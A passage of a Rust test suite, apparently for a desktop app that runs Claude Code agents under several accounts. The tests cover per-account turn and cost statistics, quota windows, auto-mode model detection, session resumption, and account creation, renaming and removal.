    // An agent of Principal and one of another account, a one-shot question in the project.
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&a, "Bonjour").await;
    let b = agent_on(&h, &p, "pro").await.id;
    h.turn(&b, "Bonjour").await;
    h.core.suggest_worktree_steps(&p.id).await.unwrap();
    let log = h.launch_log(&r);
    assert!(log.len() >= 3, "{log:?}");
    assert!(log.iter().any(|l| l["argv"].to_string().contains("\"-p\"")));
    for launch in &log {
        assert_eq!(launch["autoUpdater"], json!("1"), "{launch}");
    }
    // The reading of an account's models (in the temporary folder, shared with other tests: its
    // own launches are those with its folder).
    h.core.read_claude_models("pro").await;
    let tmp = std::env::temp_dir();
    let tmp = if cfg!(windows) {
        tmp
    } else {
        tmp.canonicalize().unwrap()
    };
    let tmp = PathBuf::from(tmp.to_string_lossy().trim_end_matches(['\\', '/']));
    let read: Vec<Value> = h
        .launch_log(&tmp)
        .into_iter()
        .filter(|l| l["configDir"] == json!(pro.config_dir))
        .collect();
    assert!(!read.is_empty());
    assert!(read.iter().all(|l| l["autoUpdater"] == json!("1")));
}

/// The turns of each account over the day, `(account, turns)`, by account.
fn turns_by_account(h: &Harness, account: Option<&str>) -> Vec<(String, u64)> {
    let mut turns: Vec<_> = h
        .core
        .stats_view("day", account)
        .by_account
        .into_iter()
        .map(|a| (a.account, a.turns))
        .collect();
    turns.sort();
    turns
}

#[tokio::test]
async fn each_turn_and_prompt_is_recorded_with_the_account_the_agent_has_at_that_turn() {
    let h = harness("accounts-stats-turns");
    // Each agent in its worktree: its own log of launches.
    let (p, _) = h.project(true).await;
    second_account(&h);
    let main = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let pro = agent_on(&h, &p, "pro").await.id;
    h.turn(&main, "Bonjour").await;
    h.turn(&pro, "Bonjour").await;
    assert_eq!(
        turns_by_account(&h, None),
        [("principal".to_string(), 1), ("pro".to_string(), 1)]
    );
    // A view for an account has its agent only, and its prompts.
    let of_pro = h.core.stats_view("day", Some("pro"));
    assert_eq!(
        of_pro
            .by_agent
            .iter()
            .map(|a| a.agent_id.as_str())
            .collect::<Vec<_>>(),
        [pro.as_str()]
    );
    assert_eq!(of_pro.prompts, 1);
    assert_eq!(h.core.stats_view("day", Some("principal")).prompts, 1);
    // Each turn counts for the account of that turn: the agent now on another one.
    h.core.agent(&pro).unwrap().lock().meta.account = "principal".into();
    h.turn(&pro, "Encore").await;
    assert_eq!(
        turns_by_account(&h, None),
        [("principal".to_string(), 2), ("pro".to_string(), 1)]
    );
    assert_eq!(h.core.stats_view("day", Some("pro")).prompts, 1);
    assert_eq!(h.core.stats_view("day", Some("principal")).prompts, 2);
}

#[tokio::test]
async fn the_cost_of_the_day_is_told_for_each_account_and_in_total_and_kept_across_a_restart() {
    let h = harness("accounts-stats-today");
    let (p, _) = h.project(true).await;
    second_account(&h);
    let main = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let pro = agent_on(&h, &p, "pro").await.id;
    // Nothing spent yet: nothing told.
    assert_eq!(h.core.usage.lock().today_cost, 0.0);
    // A turn's cost is counted just after its end reaches the window: wait for it.
    let spent = |h: &Harness, id: &str| h.core.usage.lock().account(id).unwrap().today_cost > 0.0;
    h.turn(&pro, "Bonjour").await;
    h.wait("the turn on pro counted", |h| spent(h, "pro")).await;
    assert_eq!(
        h.core.usage.lock().account("principal").unwrap().today_cost,
        0.0
    );
    h.turn(&main, "Bonjour").await;
    h.wait("the turn on principal counted", |h| spent(h, "principal"))
        .await;
    let u = h.core.usage.lock().clone();
    let of = |id: &str| u.account(id).unwrap().today_cost;
    assert!(of("principal") > 0.0 && of("pro") > 0.0);
    // The total is every account's.
    assert!((u.today_cost - of("principal") - of("pro")).abs() < 1e-9);
    assert!((u.today_cost - h.core.stats.today_cost()).abs() < 1e-9);
    // The window was told it.
    let told = h
        .events
        .lock()
        .iter()
        .rev()
        .find(|e| e["type"] == "usage")
        .cloned()
        .unwrap();
    let told_of = |id: &str| {
        told["usage"]["accounts"]
            .as_array()
            .unwrap()
            .iter()
            .find(|a| a["id"] == id)
            .unwrap()["todayCost"]
            .as_f64()
            .unwrap()
    };
    assert!((told_of("pro") - of("pro")).abs() < 1e-9);
    assert!((told_of("principal") - of("principal")).abs() < 1e-9);
    // After the app's restart, the day goes on from the statistics.
    h.core.save_now();
    let app = mock_app();
    let (reloaded, _rx) = Core::load(app.handle().clone(), h.core.data.clone());
    let r = reloaded.usage.lock().clone();
    assert!((r.account("pro").unwrap().today_cost - of("pro")).abs() < 1e-9);
    assert!((r.account("principal").unwrap().today_cost - of("principal")).abs() < 1e-9);
    assert!((r.today_cost - u.today_cost).abs() < 1e-9);
}

/// The account's 5-hour window as last read, in whole percent.
fn five_hour_pct(h: &Harness, account: &str) -> Option<f64> {
    h.core
        .usage
        .lock()
        .account(account)
        .and_then(|a| a.five_hour())
        .map(|w| w.pct.round())
}

/// Sends `text` and waits for the turn to be over, however it ends (the usage limit too).
pub(crate) async fn turn_over(h: &Harness, id: &str, text: &str) {
    h.core
        .send_message(id, text.to_string(), vec![])
        .await
        .unwrap();
    h.wait("turn started", |h| {
        h.stdin_messages(Path::new(&h.agent(id).cwd))
            .iter()
            .any(|m| m["message"]["content"] == text)
    })
    .await;
    h.wait("turn over", |h| !h.agent(id).status.is_active())
        .await;
}

#[tokio::test]
async fn what_the_claude_of_an_account_tells_of_its_models_decides_their_mode_auto() {
    // ESC-121, tried for real: Claude Code says by `initialize` which models take the mode `auto`
    // (`supportsAutoMode`); its alias haiku runs Haiku 4.5 without it up to 2.1.292, Haiku 5.5
    // with it from 2.1.293 on.
    let h = harness("accounts-auto-told");
    let (p, _) = h.project(false).await;
    let pro = second_account(&h);
    std::fs::create_dir_all(&pro.config_dir).unwrap();
    let haiku = Path::new(&pro.config_dir).join("fake-haiku");
    std::fs::write(&haiku, "4-5").unwrap();
    // Nothing told yet: the rule, where the alias takes it and Haiku 4.5 does not.
    assert!(h.core.takes_auto(EngineId::CLAUDE, "pro", "haiku"));
    assert!(!h
        .core
        .takes_auto(EngineId::CLAUDE, "pro", "claude-haiku-4-5"));
    let id = agent_on(&h, &p, "pro").await.id;
    turn_over(&h, &id, "Bonjour").await;
    // Kept with the version that told it, for this account alone, and saved.
    let told = h.core.account_models.read().get("pro").cloned().unwrap();
    assert_eq!(told.version, "2.1.301");
    assert!(!h.core.takes_auto(EngineId::CLAUDE, "pro", "haiku"));
    assert!(h.core.takes_auto(EngineId::CLAUDE, "pro", "sonnet"));
    assert!(h.core.takes_auto(EngineId::CLAUDE, "principal", "haiku"));
    // Another harness keeps its own rule, whatever a Claude account told.
    assert!(!h.core.takes_auto(EngineId::OPENCODE, "pro", "sonnet"));
    h.core.save_now();
    let saved: Value =
        serde_json::from_slice(&std::fs::read(h.core.data.state_file()).unwrap()).unwrap();
    assert_eq!(saved["accountModels"]["pro"]["version"], "2.1.301");
    // Its `claude` updated (its alias on Haiku 5.5): the next process start tells it.
    std::fs::write(&haiku, "5-5").unwrap();
    let again = agent_on(&h, &p, "pro").await.id;
    turn_over(&h, &again, "Encore").await;
    assert!(h.core.takes_auto(EngineId::CLAUDE, "pro", "haiku"));
}

#[tokio::test]
async fn the_current_account_moving_on_never_moves_the_account_of_a_running_agent() {
    // ESC-147: Principal at the limit, new agents go to Pro (the status bar's account), but the
    // agent already started keeps its process, so its account (card, header, quota readings).
    let h = harness("accounts-current-moves");
    let (p, _) = h.project(true).await;
    let pro = second_account(&h);
    let main = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    turn_over(&h, &main, "Bonjour").await;
    h.wait("the quota of Principal", |h| {
        five_hour_pct(h, "principal") == Some(12.0)
    })
    .await;
    assert_eq!(h.core.account_of(&main), "principal");
    // Principal reads 100 %: the account new agents go to is now Pro.
    h.core.update_usage(|u| {
        u.record(
            "principal",
            crate::usage::Reading::claude((
                Some(RateWindow {
                    pct: 100.0,
                    resets_at: Some(now_ms() + 3_600_000),
                }),
                None,
            )),
            now_ms(),
        )
    });
    assert_eq!(h.core.usage.lock().claude_current(), "pro");
    assert_eq!(h.core.current_account(EngineId::CLAUDE).id, pro.id);
    // The agent already started is still on Principal, as its process is.
    assert_eq!(h.core.account_of(&main), "principal");
    // An agent started now goes to Pro.
    let fresh = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    assert_eq!(h.core.account_of(&fresh), "pro");
    // The next turn of the first is read on Principal, not on Pro.
    turn_over(&h, &main, "Encore").await;
    assert_eq!(h.core.account_of(&main), "principal");
    assert_eq!(five_hour_pct(&h, "pro"), None);
}

#[tokio::test]
async fn an_account_answering_as_extra_usage_is_told_so_and_only_it() {
    // ESC-147: at 100 % of its window an account with extra usage goes on answering; the status
    // bar must be able to say so, whichever account new agents are sent to.
    let h = harness("accounts-overage");
    let (p, _) = h.project(true).await;
    let pro = second_account(&h);
    let overage = |h: &Harness, id: &str| {
        h.core
            .usage
            .lock()
            .account(id)
            .map(|a| a.overage)
            .unwrap_or(false)
    };
    let main = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    turn_over(&h, &main, "Bonjour").await;
    h.wait("the quota of Principal", |h| {
        five_hour_pct(h, "principal") == Some(12.0)
    })
    .await;
    assert!(!overage(&h, "principal"));
    std::fs::create_dir_all(&pro.config_dir).unwrap();
    let flag = Path::new(&pro.config_dir).join("fake-overage");
    std::fs::write(&flag, "").unwrap();
    let id = agent_on(&h, &p, "pro").await.id;
    turn_over(&h, &id, "Bonjour").await;
    h.wait("Pro in extra usage", |h| overage(h, "pro")).await;
    assert!(!overage(&h, "principal"));
    // Its next turn, no longer in extra usage: told too.
    std::fs::remove_file(&flag).unwrap();
    turn_over(&h, &id, "Encore").await;
    h.wait("Pro out of extra usage", |h| !overage(h, "pro"))
        .await;
}

#[tokio::test]
async fn a_rate_limit_event_of_an_agent_on_the_second_account_only_touches_its_quota() {
    let h = harness("accounts-quota-event");
    // Each agent in its worktree: each its own log of messages.
    let (p, _) = h.project(true).await;
    let pro = second_account(&h);
    // A turn on Principal: its windows only.
    let main = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    turn_over(&h, &main, "Bonjour").await;
    h.wait("Principal's quota", |h| {
        five_hour_pct(h, "principal") == Some(12.0)
    })
    .await;
    assert_eq!(five_hour_pct(&h, "pro"), None);
    // Pro out of quota: its agent's turn stops at the limit, Pro alone at 100 %.
    std::fs::create_dir_all(&pro.config_dir).unwrap();
    let limit = Path::new(&pro.config_dir).join("fake-limit");
    std::fs::write(&limit, "").unwrap();
    let id = agent_on(&h, &p, "pro").await.id;
    turn_over(&h, &id, "Bonjour").await;
    h.wait("Pro's quota", |h| five_hour_pct(h, "pro") == Some(100.0))
        .await;
    assert_eq!(five_hour_pct(&h, "principal"), Some(12.0));
    // Principal stays the current account: its windows are the status bar's.
    let u = h.core.usage.lock().clone();
    assert_eq!(u.claude_current(), "principal");
    assert_eq!(u.five_hour().map(|w| w.pct.round()), Some(12.0));
    // Principal at the limit too: every account past the threshold, the first active one.
    turn_over(&h, &main, "la limite").await;
    h.wait("Principal at the limit", |h| {
        five_hour_pct(h, "principal") == Some(100.0)
    })
    .await;
    assert_eq!(h.core.usage.lock().claude_current(), "principal");
    // Pro has quota again: it is the first one under the threshold, its windows first.
    std::fs::remove_file(&limit).unwrap();
    turn_over(&h, &id, "Encore").await;
    h.wait("Pro under the threshold", |h| {
        five_hour_pct(h, "pro") == Some(12.0)
    })
    .await;
    let u = h.core.usage.lock().clone();
    assert_eq!(u.claude_current(), "pro");
    assert_eq!(u.five_hour().map(|w| w.pct.round()), Some(12.0));
    assert_eq!(five_hour_pct(&h, "principal"), Some(100.0));
    // As the window was told.
    let told = h
        .events
        .lock()
        .iter()
        .rev()
        .find(|e| e["type"] == "usage")
        .cloned()
        .unwrap();
    assert_eq!(told["usage"]["current"]["claude"], "pro");
    let ids: Vec<&Value> = told["usage"]["accounts"]
        .as_array()
        .unwrap()
        .iter()
        .map(|a| &a["id"])
        .collect();
    assert_eq!(ids, [&json!("principal"), &json!("pro")]);
    assert_eq!(told["usage"]["accounts"][1]["connected"], true);
}

#[tokio::test]
async fn an_agent_waits_for_the_windows_of_its_own_account() {
    let h = harness("accounts-quota-resume");
    let (p, _) = h.project(false).await;
    second_account(&h);
    let reset = now_ms() + 7_200_000;
    let full = Some(RateWindow {
        pct: 100.0,
        resets_at: Some(reset),
    });
    h.core.record_usage("pro", Reading::claude((full, None)));
    // Pro's full window is none of Principal's agents'.
    let main = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.plan_resume(&main, None);
    assert_eq!(h.agent(&main).resume_at, None);
    let id = agent_on(&h, &p, "pro").await.id;
    h.core.plan_resume(&id, None);
    let at = h
        .agent(&id)
        .resume_at
        .expect("planned from its account's window");
    assert!(at > reset && at < reset + 120_000, "{at} vs {reset}");
}

#[tokio::test]
async fn each_active_account_is_read_with_its_own_sign_in_at_most_every_five_minutes() {
    use crate::integrations::fake::FakeServer;
    let h = harness("accounts-quota-endpoint");
    let server = FakeServer::start().await;
    server.on(
        "GET",
        "/api/oauth/usage",
        200,
        json!({ "five_hour": { "utilization": 40.0, "resets_at": "2099-01-01T00:00:00+00:00" },
                "seven_day": { "utilization": 7.0, "resets_at": null } }),
    );
    *h.core.usage_api.write() = format!("{}/api/oauth/usage", server.url);
    let account = |id: &str, active: bool| {
        let dir = h.dir.join(format!("claude-{id}"));
        std::fs::create_dir_all(&dir).unwrap();
        Account {
            id: id.into(),
            name: id.into(),
            config_dir: dir.to_string_lossy().into(),
            active,
            ..Default::default()
        }
    };
    let sign_in = |a: &Account, token: &str, expires_at: i64| {
        let creds = json!({ "claudeAiOauth": { "accessToken": token, "expiresAt": expires_at } });
        std::fs::write(
            Path::new(&a.config_dir).join(".credentials.json"),
            creds.to_string(),
        )
        .unwrap();
    };
    let (pro, vide, vieux, off) = (
        account("pro", true),
        account("vide", true),
        account("vieux", true),
        account("off", false),
    );
    let later = now_ms() + 3_600_000;
    sign_in(&pro, "tok-pro", later);
    sign_in(&vieux, "tok-vieux", now_ms() - 1_000);
    sign_in(&off, "tok-off", later);
    let mut s = h.core.settings.read().clone();
    // Principal at rest: its sign-in would be the machine user's own.
    s.accounts[0].active = false;
    s.accounts.extend([pro, vide, vieux, off]);
    h.core.save_settings(s).unwrap();
    let tokens = |server: &FakeServer| -> Vec<String> {
        server
            .requests()
            .iter()
            .map(|r| r.headers["authorization"].clone())
            .collect()
    };
    let get = |h: &Harness, id: &str| h.core.usage.lock().account(id).cloned().unwrap();
    h.core.refresh_usage().await;
    // One call, for the only account signed in and active.
    assert_eq!(tokens(&server), ["Bearer tok-pro"]);
    let read = get(&h, "pro");
    assert_eq!(read.five_hour().map(|w| w.pct), Some(40.0));
    assert_eq!(read.seven_day().map(|w| w.pct), Some(7.0));
    assert_eq!((read.connected, read.reason.as_deref()), (true, None));
    let none = get(&h, "vide");
    assert_eq!(
        (none.connected, none.reason.as_deref()),
        (false, Some("Pas connecté"))
    );
    let old = get(&h, "vieux");
    assert_eq!(
        (old.connected, old.reason.as_deref(), old.five_hour()),
        (
            true,
            Some("Connexion expirée : relance Claude Code pour ce compte."),
            None
        )
    );
    // At rest: neither asked nor read.
    assert_eq!(get(&h, "off").five_hour(), None);
    assert_eq!(get(&h, "principal").five_hour(), None);
    // The first active one, under the threshold: the current account.
    let u = h.core.usage.lock().clone();
    assert_eq!(
        (u.claude_current(), u.five_hour().map(|w| w.pct)),
        ("pro", Some(40.0))
    );
    // Again within the five minutes: not asked again.
    h.core.refresh_usage().await;
    assert_eq!(tokens(&server).len(), 1);
    // Signed in meanwhile: the account that had no sign-in is read at the next reading, not five
    // minutes later.
    let creds = json!({ "claudeAiOauth": { "accessToken": "tok-vide", "expiresAt": later } });
    std::fs::write(
        h.dir.join("claude-vide").join(".credentials.json"),
        creds.to_string(),
    )
    .unwrap();
    h.core.refresh_usage().await;
    assert_eq!(tokens(&server), ["Bearer tok-pro", "Bearer tok-vide"]);
    let signed = get(&h, "vide");
    assert_eq!(
        (
            signed.connected,
            signed.reason.clone(),
            signed.five_hour().map(|w| w.pct)
        ),
        (true, None, Some(40.0))
    );
    // Five minutes later, the network down: the last values stay.
    h.core.last_oauth_call.lock().clear();
    *h.core.usage_api.write() = crate::usage::api_from_env();
    h.core.refresh_usage().await;
    let kept = get(&h, "pro");
    assert_eq!(
        (kept.five_hour().map(|w| w.pct), kept.connected),
        (Some(40.0), true)
    );
    assert_eq!(kept.updated_at, read.updated_at);
}

#[tokio::test]
async fn each_account_with_a_running_agent_is_asked_its_quota_by_a_process_of_its_own() {
    use crate::integrations::fake::FakeServer;
    let h = harness("accounts-quota-get-usage");
    let server = FakeServer::start().await;
    *h.core.usage_api.write() = format!("{}/api/oauth/usage", server.url);
    let (p, _) = h.project(false).await;
    let pro = second_account(&h);
    // Pro out of quota: its processes say 100 %, Principal's 12 %.
    std::fs::create_dir_all(&pro.config_dir).unwrap();
    std::fs::write(Path::new(&pro.config_dir).join("fake-limit"), "").unwrap();
    let main = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let id = agent_on(&h, &p, "pro").await.id;
    h.wait("both processes", |h| h.alive(&main) && h.alive(&id))
        .await;
    h.core.refresh_usage().await;
    assert_eq!(five_hour_pct(&h, "pro"), Some(100.0));
    assert_eq!(five_hour_pct(&h, "principal"), Some(12.0));
    // Both read from their processes: the endpoint was asked nothing.
    assert!(server.requests().is_empty(), "{:?}", server.requests());
}

#[tokio::test]
async fn quota_windows_saved_before_the_accounts_are_principals_and_each_account_keeps_its_own() {
    let dir = test_dir("accounts-quota-saved");
    let data = DataDir::new(dir.join("data"));
    data.ensure().unwrap();
    let pro = Account {
        id: "pro".into(),
        name: "Pro".into(),
        config_dir: dir.join("pro").to_string_lossy().into(),
        ..Default::default()
    };
    let settings = Settings {
        sound: false,
        accounts: vec![crate::accounts::principal(), pro],
        ..Default::default()
    };
    std::fs::write(data.settings_file(), serde_json::to_vec(&settings).unwrap()).unwrap();
    // As the versions before the accounts saved them: the windows of the only account.
    let end = now_ms() + 3_600_000;
    let pause = json!({ "fiveHour": { "pct": 96.0, "resetsAt": end },
                        "sevenDay": { "pct": 30.0, "resetsAt": end }, "hold": {} });
    std::fs::write(
        data.state_file(),
        json!({ "projects": [], "pause": pause }).to_string(),
    )
    .unwrap();
    let app = mock_app();
    let (core, _rx) = Core::load(app.handle().clone(), data.clone());
    let pct = |core: &Core<MockRuntime>, id: &str| {
        core.usage
            .lock()
            .account(id)
            .and_then(|a| a.five_hour())
            .map(|w| w.pct)
    };
    assert_eq!(pct(&core, "principal"), Some(96.0));
    assert_eq!(pct(&core, "pro"), None);
    let u = core.usage.lock().clone();
    assert_eq!(
        (u.claude_current(), u.five_hour().map(|w| w.pct)),
        ("principal", Some(96.0))
    );
    // Pro's own, read since: kept for it across a restart, Principal's where they were.
    let half = Some(RateWindow {
        pct: 50.0,
        resets_at: Some(end),
    });
    core.record_usage("pro", Reading::claude((half, None)));
    core.save_now();
    let saved: Value = serde_json::from_slice(&std::fs::read(data.state_file()).unwrap()).unwrap();
    assert_eq!(saved["pause"]["fiveHour"]["pct"], json!(96.0));
    assert_eq!(
        saved["pause"]["accounts"]["pro"]["fiveHour"]["pct"],
        json!(50.0)
    );
    let (again, _rx) = Core::load(app.handle().clone(), data);
    assert_eq!(pct(&again, "principal"), Some(96.0));
    assert_eq!(pct(&again, "pro"), Some(50.0));
}

#[tokio::test]
async fn an_agent_resumes_its_session_on_its_account_after_its_process_restarts() {
    let h = harness("accounts-resume");
    let (p, r) = h.project(false).await;
    let pro = second_account(&h);
    let id = agent_on(&h, &p, "pro").await.id;
    h.turn(&id, "Premier").await;
    let session = h.agent(&id).session_id.unwrap();
    // Idle-stopped, say: the next message starts it again.
    let old = h.core.agent(&id).unwrap().lock().detach().unwrap();
    old.close_input();
    h.turn(&id, "Second").await;
    let last = h.launch_log(&r).last().cloned().unwrap();
    assert_eq!(last["configDir"], json!(pro.config_dir));
    assert!(last["argv"]
        .as_array()
        .unwrap()
        .contains(&json!(format!("--resume={session}"))));
    // Found in its account's folder: the same session goes on.
    assert_eq!(h.agent(&id).session_id, Some(session));
    assert!(
        h.error_notices(&id).is_empty(),
        "{:?}",
        h.error_notices(&id)
    );
    // A copy forks that session: on the same account, where it is kept.
    let copy = h.core.duplicate_agent(&id).await.unwrap().meta;
    assert_eq!(copy.account, "pro");
    // And after the app's restart, the agent is still on it.
    h.core.save_now();
    let app = mock_app();
    let (reloaded, _rx) = Core::load(app.handle().clone(), h.core.data.clone());
    assert_eq!(reloaded.agent(&id).unwrap().lock().meta.account, "pro");
    assert_eq!(reloaded.settings.read().accounts[1], pro);
}

fn account_ids(accounts: &[Account]) -> Vec<String> {
    accounts.iter().map(|a| a.id.clone()).collect()
}

/// The accounts as `settings.json` keeps them.
fn saved_accounts(h: &Harness) -> Vec<Account> {
    let saved: Settings =
        serde_json::from_slice(&std::fs::read(h.core.data.settings_file()).unwrap()).unwrap();
    saved.accounts
}

#[tokio::test]
async fn an_account_made_in_its_tab_gets_a_folder_of_its_own_and_comes_last() {
    use crate::accounts::ShareMode;
    let h = harness("accounts-tab-create");
    let made = h
        .core
        .create_claude_account(" Pro ", &[], ShareMode::Link)
        .unwrap();
    let dir = h.core.data.claude_accounts().join("pro");
    assert_eq!(
        made,
        Account {
            engine: EngineId::CLAUDE,
            id: "pro".into(),
            name: "Pro".into(),
            config_dir: dir.to_string_lossy().into(),
            claude_path: String::new(),
            active: true,
            projects: Vec::new(),
            daily_budget: None,
            ..Default::default()
        }
    );
    assert!(dir.is_dir());
    // Saved last, in the file too; the quotas know it.
    assert_eq!(
        account_ids(&h.core.settings.read().accounts),
        ["principal", "pro"]
    );
    assert_eq!(saved_accounts(&h)[1], made);
    assert!(h.core.usage.lock().account("pro").is_some());
    // Principal's folder in unit tests is no one's: nothing to share.
    assert!(h.core.claude_shareable().is_empty());
    // Named as another: refused.
    let e = h
        .core
        .create_claude_account("pro", &[], ShareMode::Copy)
        .unwrap_err();
    assert_eq!(e.to_string(), "Un compte s’appelle déjà « pro ».");
    // Removed: gone from the settings, its folder left on the disk with its sign-in; a new
    // account of the same name gets another one.
    std::fs::write(dir.join(".credentials.json"), "{}").unwrap();
    let left = h.core.remove_claude_account("pro").unwrap();
    assert_eq!(account_ids(&left), ["principal"]);
    assert_eq!(account_ids(&saved_accounts(&h)), ["principal"]);
    assert!(dir.join(".credentials.json").is_file());
    let again = h
        .core
        .create_claude_account("Pro", &[], ShareMode::Copy)
        .unwrap();
    assert_eq!(again.id, "pro-2");
}

#[tokio::test]
async fn an_account_an_agent_still_runs_on_is_not_removed() {
    use crate::accounts::ShareMode;
    let h = harness("accounts-tab-remove");
    let (p, _) = h.project(false).await;
    let pro = h
        .core
        .create_claude_account("Pro", &[], ShareMode::Copy)
        .unwrap();
    let one = agent_on(&h, &p, &pro.id).await.id;
    let two = agent_on(&h, &p, &pro.id).await.id;
    let refused = |h: &Harness| {
        h.core
            .remove_claude_account(&pro.id)
            .unwrap_err()
            .to_string()
    };
    assert_eq!(refused(&h), "Le compte sert encore à 2 agents.");
    h.core.archive_agent(&one, true).await.unwrap();
    assert_eq!(refused(&h), "Le compte sert encore à 1 agent.");
    assert_eq!(
        account_ids(&h.core.settings.read().accounts),
        ["principal", "pro"]
    );
    // Archived, an agent no longer holds it.
    h.core.archive_agent(&two, true).await.unwrap();
    let left = h.core.remove_claude_account(&pro.id).unwrap();
    assert_eq!(account_ids(&left), ["principal"]);
    // The machine's goes like any other (ESC-128): its agents first; an account gone meanwhile is
    // said so.
    let three = agent_on(&h, &p, "principal").await.id;
    assert_eq!(
        h.core
            .remove_claude_account("principal")
            .unwrap_err()
            .to_string(),
        "Le compte sert encore à 1 agent."
    );
    h.core.archive_agent(&three, true).await.unwrap();
    assert!(h
        .core
        .remove_claude_account("principal")
        .unwrap()
        .is_empty());
    let e = h.core.remove_claude_account("parti").unwrap_err();
    assert_eq!(e.to_string(), "compte « parti » introuvable");
}

#[tokio::test]
async fn the_accounts_are_renamed_ordered_and_put_at_rest_in_their_tab() {
    use crate::accounts::ShareMode;
    let h = harness("accounts-tab-update");
    let pro = h
        .core
        .create_claude_account("Pro", &[], ShareMode::Copy)
        .unwrap();
    let perso = h
        .core
        .create_claude_account("Perso", &[], ShareMode::Copy)
        .unwrap();
    // Renamed, its own claude, at rest: its folder stays its own, whatever the window sends.
    let list = h
        .core
        .update_claude_account(Account {
            name: "  Boulot ".into(),
            claude_path: " C:/outils/claude.exe ".into(),
            active: false,
            config_dir: "ailleurs".into(),
            ..pro.clone()
        })
        .unwrap();
    let boulot = Account {
        name: "Boulot".into(),
        claude_path: "C:/outils/claude.exe".into(),
        active: false,
        ..pro.clone()
    };
    assert_eq!(list[1], boulot);
    assert_eq!(saved_accounts(&h)[1], boulot);
    let refused = |a: Account| h.core.update_claude_account(a).unwrap_err().to_string();
    assert_eq!(
        refused(Account {
            name: " ".into(),
            ..perso.clone()
        }),
        "Donne un nom au compte."
    );
    assert_eq!(
        refused(Account {
            name: "boulot".into(),
            ..perso.clone()
        }),
        "Un compte s’appelle déjà « boulot »."
    );
    // In another order.
    let order = |ids: &[&str]| {
        let ids: Vec<String> = ids.iter().map(|i| i.to_string()).collect();
        h.core.reorder_claude_accounts(&ids)
    };
    let list = order(&["perso", "principal", "pro"]).unwrap();
    assert_eq!(account_ids(&list), ["perso", "principal", "pro"]);
    assert_eq!(
        account_ids(&saved_accounts(&h)),
        ["perso", "principal", "pro"]
    );
    // Not each account once: the window's list is older.
    for ids in [
        &["principal", "pro"][..],
        &["perso", "principal", "pro", "pro"],
    ] {
        assert_eq!(
            order(ids).unwrap_err().to_string(),
            "La liste des comptes a changé : ferme les réglages et rouvre-les."
        );
    }
    // At least one account active: Perso may rest, then Principal can no longer.
    let principal = h.core.settings.read().accounts[1].clone();
    h.core
        .update_claude_account(Account {
            active: false,
            ..perso.clone()
        })
        .unwrap();
    assert_eq!(
        refused(Account {
            active: false,
            ..principal
        }),
        "Il faut au moins un compte actif par harness."
    );
    // An account gone meanwhile.
    assert_eq!(
        refused(Account {
            id: "parti".into(),
            ..perso
        }),
        "compte « parti » introuvable"
    );
}

#[tokio::test]
async fn the_windows_other_settings_never_change_the_accounts() {
    use crate::accounts::ShareMode;
    let h = harness("accounts-tab-window");
    h.core
        .create_claude_account("Pro", &[], ShareMode::Copy)
        .unwrap();
    // As a window opened before the account was made sends them.
    let mut s = h.core.settings.read().clone();
    s.accounts.truncate(1);
    s.sound = true;
    h.core.save_window_settings(s).unwrap();
    assert!(h.core.settings.read().sound);
    assert_eq!(
        account_ids(&h.core.settings.read().accounts),
        ["principal", "pro"]
    );
    assert_eq!(account_ids(&saved_accounts(&h)), ["principal", "pro"]);
}

#[tokio::test]
async fn an_account_needs_a_folder_written_in_full_to_be_saved() {
    let h = harness("accounts-tab-check");
    let mut s = h.core.settings.read().clone();
    s.accounts.push(Account {
        id: "pro".into(),
        name: "Pro".into(),
        config_dir: "claude/pro".into(),
        ..Default::default()
    });
    let e = h.core.save_settings(s).unwrap_err();
    assert_eq!(
        e.to_string(),
        "Le dossier du compte « Pro » doit être un chemin complet : claude/pro"
    );
    assert_eq!(account_ids(&h.core.settings.read().accounts), ["principal"]);
}

#[tokio::test]
async fn an_accounts_status_tells_whether_it_is_signed_in_and_with_which_email() {
    use crate::accounts::{AccountStatus, ShareMode};
    let h = harness("accounts-tab-status");
    let pro = h
        .core
        .create_claude_account("Pro", &[], ShareMode::Copy)
        .unwrap();
    let dir = Path::new(&pro.config_dir);
    let status = |h: &Harness, id: &str| {
        let core = h.core.clone();
        let id = id.to_string();
        async move { core.claude_account_status(&id).await }
    };
    assert_eq!(
        status(&h, "pro").await.unwrap(),
        AccountStatus {
            connected: false,
            email: None,
            dir: pro.config_dir.clone(),
            stamp: None,
        }
    );
    // Signed in: Claude Code wrote its sign-in and its email in the account's folder.
    let creds_of = |token: &str, expires_at: i64| {
        json!({ "claudeAiOauth": { "accessToken": token, "expiresAt": expires_at } }).to_string()
    };
    let creds = |expires_at: i64| creds_of("tok-pro", expires_at);
    std::fs::write(dir.join(".credentials.json"), creds(now_ms() + 3_600_000)).unwrap();
    std::fs::write(
        dir.join(".claude.json"),
        r#"{"oauthAccount":{"emailAddress":"ada@atlas.dev"}}"#,
    )
    .unwrap();
    let signed = status(&h, "pro").await.unwrap();
    assert_eq!(
        (signed.connected, signed.email.as_deref()),
        (true, Some("ada@atlas.dev"))
    );
    // Which sign-in it is, told without the token.
    let stamp = signed.stamp.clone().expect("signed in: a stamp");
    assert!(!stamp.contains("tok-pro"));
    // Its token out of date: still signed in (Claude Code gets another one when it runs), and
    // the same sign-in: the window tells it from the one the user makes next.
    std::fs::write(dir.join(".credentials.json"), creds(now_ms() - 1_000)).unwrap();
    let late = status(&h, "pro").await.unwrap();
    assert_eq!(
        (late.connected, late.stamp.as_deref()),
        (true, Some(stamp.as_str()))
    );
    // Signed in again: another token, another stamp.
    std::fs::write(
        dir.join(".credentials.json"),
        creds_of("tok-again", now_ms() + 3_600_000),
    )
    .unwrap();
    let again = status(&h, "pro").await.unwrap();
    assert!(again.connected);
    assert!(again.stamp.is_some() && again.stamp.as_deref() != Some(stamp.as_str()));
    // Signed out: its email is not told, nor its stamp.
    std::fs::remove_file(dir.join(".credentials.json")).unwrap();
    let out = status(&h, "pro").await.unwrap();
    assert_eq!((out.email, out.stamp), (None, None));
    // Principal, in unit tests: a home folder that is no one's, never the machine user's.
    let main = status(&h, "principal").await.unwrap();
    assert!(!main.connected);
    assert_eq!(
        Path::new(&main.dir),
        std::env::temp_dir()
            .join("escouade-tests-no-home")
            .join(".claude")
    );
